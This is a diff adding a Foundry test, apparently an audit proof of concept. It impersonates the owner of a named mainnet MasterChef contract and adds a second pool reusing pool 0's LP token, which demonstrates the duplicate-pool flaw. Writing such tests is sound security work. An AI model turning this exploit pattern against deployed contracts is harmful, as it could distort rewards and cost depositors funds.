@@ -1,0 +1,65 @@
+```solidity
+// SPDX-License-Identifier: Unlicense
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+interface IERC20 {
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IMasterChef {
+    function owner() external view returns (address);
+    function poolLength() external view returns (uint256);
+    function poolInfo(uint256 pid) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
+    function add(uint256 _allocPoint, address _lpToken, bool _withUpdate) external;
+    function deposit(uint256 _pid, uint256 _amount) external;
+    function userInfo(uint256 pid, address user) external view returns (uint256 amount, uint256 rewardDebt);
+    function totalAllocPoint() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Deployed MasterChef on Ethereum mainnet
+    address constant MASTER_CHEF = 0xc2edad668740f1aa35e4d8f227fb8e17dca888cd;
+
+    IMasterChef masterChef;
+    address lpToken0;
+
+    function setUp() public {
+        masterChef = IMasterChef(MASTER_CHEF);
+        vm.label(MASTER_CHEF, "MasterChef");
+
+        // Get an existing LP token from pool 0
+        (address lp,,,) = masterChef.poolInfo(0);
+        lpToken0 = lp;
+        vm.label(lpToken0, "lpToken0");
+    }
+
+    function testDuplicatePoolAddition() public {
+        // Get the owner
+        address owner = masterChef.owner();
+        vm.label(owner, "Owner");
+
+        uint256 poolCountBefore = masterChef.poolLength();
+
+        // Impersonate owner and add a pool with the same LP token as pool 0
+        vm.startPrank(owner);
+        masterChef.add(1000, lpToken0, false);
+        vm.stopPrank();
+
+        uint256 poolCountAfter = masterChef.poolLength();
+
+        // Assert that a duplicate pool was added
+        assertEq(poolCountAfter, poolCountBefore + 1, "Pool count should increase by 1");
+
+        // Verify the new pool indeed has the duplicate LP token
+        uint256 newPid = poolCountAfter - 1;
+        (address newLpToken,,,) = masterChef.poolInfo(newPid);
+        assertEq(newLpToken, lpToken0, "New pool should have same LP token");
+
+        // Optional: demonstrate that a user can deposit into both pools (requires LP tokens)
+        // To fully demonstrate impact, we would need LP tokens. Here we just show the duplicate was added.
+    }
+}
+```
